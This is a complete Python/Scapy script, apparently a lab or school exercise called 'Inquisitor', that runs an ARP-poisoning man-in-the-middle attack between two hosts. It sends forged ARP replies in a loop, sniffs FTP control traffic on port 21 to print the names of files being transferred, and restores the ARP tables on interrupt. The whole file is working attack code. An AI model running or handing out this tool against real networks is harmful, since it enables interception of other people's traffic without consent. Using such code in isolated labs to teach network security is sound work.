import argparse
import ipaddress
import macaddress
import sys
import signal
import threading
import time
from scapy.all import *
from pathlib import Path

# Callback executed for every packet captured on port 21 (FTP control channel).
# Looks for RETR/STOR commands and prints the file name in real time.
def display_file_name(packet):
    if Raw in packet:
        try:
            payload = packet[Raw].load.decode().strip()
            if payload.startswith("RETR") or payload.startswith("STOR"):
                parts = payload.split(" ")
                if len(parts) > 1:
                    print(f'File name: {parts[1]}')
        except Exception as e:
            print(f'Exception raised in the display_file_name function: {e}')

# Sends the real ARP IP/MAC associations to both victims several times,
# overwriting the poisoned cache entries left by the attack.
def restore_arp_tables(arguments):
    real_resp_to_src = Ether(dst=arguments[1]) / ARP(op=2, psrc=str(arguments[2]), hwsrc=str(arguments[3]), pdst=str(arguments[0]), hwdst=str(arguments[1]))
    real_resp_to_dst = Ether(dst=arguments[3]) / ARP(op=2, psrc=str(arguments[0]), hwsrc=str(arguments[1]), pdst=str(arguments[2]), hwdst=str(arguments[3]))
    
    for i in range(3):
        sendp(real_resp_to_src, verbose=False)
        sendp(real_resp_to_dst, verbose=False)
        time.sleep(2)

    print('ARP tables are restored.')

# Continuously sends forged ARP replies to both victims (full duplex poisoning)
# until stop_event is set by the signal handler.
def poison(arguments, inqui_mac_addr, stop_event):
    fake_resp_to_src = Ether(dst=arguments[1]) / ARP(op=2, psrc=str(arguments[2]), hwsrc=str(inqui_mac_addr), pdst=str(arguments[0]), hwdst=str(arguments[1]))
    fake_resp_to_dst = Ether(dst=arguments[3]) / ARP(op=2, psrc=str(arguments[0]), hwsrc=str(inqui_mac_addr), pdst=str(arguments[2]), hwdst=str(arguments[3]))
    
    while not stop_event.is_set():
        sendp(fake_resp_to_src, verbose=False)
        sendp(fake_resp_to_dst, verbose=False)
        time.sleep(2)

# Reads the container's own MAC address from the eth0 interface.
# Exits the program if it cannot be retrieved.
def get_inqui_mac_addr():
    path = Path("/sys/class/net/eth0/address")

    if path.is_file():
        return path.read_text().strip()
    else:
        print('Unable to retrieve the MAC address of the Inquisitor container.')
        sys.exit(1)

# Orchestrates the attack: starts the poisoning thread, registers signal
# handlers for a clean shutdown, then sniffs FTP control traffic on the
# main thread until interrupted.
def inquisitor(ip_src, mac_src, ip_dst, mac_dst):
    arguments = [ip_src, mac_src, ip_dst, mac_dst]
    inqui_mac_addr = get_inqui_mac_addr()
    stop_event = threading.Event()
    
    t = threading.Thread(target=poison, args=(arguments, inqui_mac_addr, stop_event))

    def signal_handler(signum, frame):
        print(f'Signal catched: {signum}')
        stop_event.set()
        t.join()
        restore_arp_tables(arguments)
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    t.start()
    sniff(iface="eth0", filter="tcp port 21", prn=display_file_name, store=False)

# Verify that the given IP/MAC pairs are valid using ARP requests.
def is_valid_argument(arguments):
    try:
        ip_src = ipaddress.IPv4Address(arguments.IP_src)
        mac_src = macaddress.MAC(arguments.MAC_src)
        ip_dst = ipaddress.IPv4Address(arguments.IP_target)
        mac_dst = macaddress.MAC(arguments.MAC_target)

        ether_packet = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet1 = ARP(pdst=str(ip_src))
        arp_packet2 = ARP(pdst=str(ip_dst))

        final_packet1 = ether_packet/arp_packet1
        final_packet2 = ether_packet/arp_packet2

        answer1 = srp(final_packet1, timeout=2, verbose=False)[0]
        answer2 = srp(final_packet2, timeout=2, verbose=False)[0]

        if not answer1 or not answer2:
            print('Unable to verify the provided IP/MAC pairs (no ARP response received).')
            return False

        mac_received1 = answer1[0][1].hwsrc
        mac_received2 = answer2[0][1].hwsrc

        if mac_src != macaddress.MAC(mac_received1) or mac_dst != macaddress.MAC(mac_received2):
            print('Invalid MAC addresses.')
            return False
        return True

    except ipaddress.AddressValueError:
        print('The provided IP address is not in IPv4 format.')
        return False
    except ValueError:
        print('Invalid MAC address format.')
        return False
    except Exception as e:
        print(f'Inquisitor: error: {e}')
        return False

# Creates and parses the command-line arguments provided by the user.
def parse_arguments():
    parser = argparse.ArgumentParser(description='ARP poison program for educational purpose only.')
    parser.add_argument('IP_src', type=str, help='sender\'s IP address')
    parser.add_argument('MAC_src', type=str, help='sender\'s MAC address')
    parser.add_argument('IP_target', type=str, help='receiver\'s IP address')
    parser.add_argument('MAC_target', type=str, help='receiver\'s MAC address')
    return parser.parse_args()

# Main entry point: parses arguments, validates them, then launches the attack.
def main():
    args = parse_arguments()
    if is_valid_argument(args):
        inquisitor(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)

# Execute the main function only when this script is run directly
if __name__ == "__main__":
    main()
